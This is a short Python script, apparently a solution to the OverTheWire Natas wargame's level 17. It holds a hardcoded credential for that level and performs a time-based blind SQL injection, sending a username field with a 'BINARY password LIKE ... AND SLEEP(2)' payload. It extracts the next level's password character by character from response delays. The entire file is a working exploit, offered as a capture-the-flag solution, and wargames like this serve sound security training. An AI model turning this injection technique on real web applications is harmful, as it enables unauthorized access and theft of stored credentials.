import requests
from string import *
from time import *

username = "natas17"
password = "8Ps3H0GWbn5rd9S7GmAdgQNdkhPkq9cw"

session = requests.Session()

url = "http://{}.natas.labs.overthewire.org/".format(username)

characters = ascii_lowercase + ascii_uppercase + digits
# characters = abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ0123456789

password_tried = ""  # empty string
# password_tried = list()

while len(password_tried) != 32:
    for ch in characters:
        print("trying this password now --> {}{}".format(password_tried, ch))
        start_time = time()  # start timer
        response = session.post(url, data={
            "username": "natas18\" AND BINARY password LIKE \"{}{}%\" AND SLEEP(2)#".format(password_tried, ch)}, auth=(username, password))  # SLEEP forces the SQL result to delay the output
        # response = session.post(
        #    url, data={"username": "natas18\" AND BINARY password LIKE \"{}{}%\" AND SLEEP(2)#".format("".join(password_tried), ch)}, auth=(username, password))
        content = response.text
        end_time = time()  # end timer
        # calculate difference between start time and end time
        difference = end_time - start_time

        if difference > 1:
            password_tried += ch  # add character to string
            # password_tried.append(ch)
            break

print(password_tried)
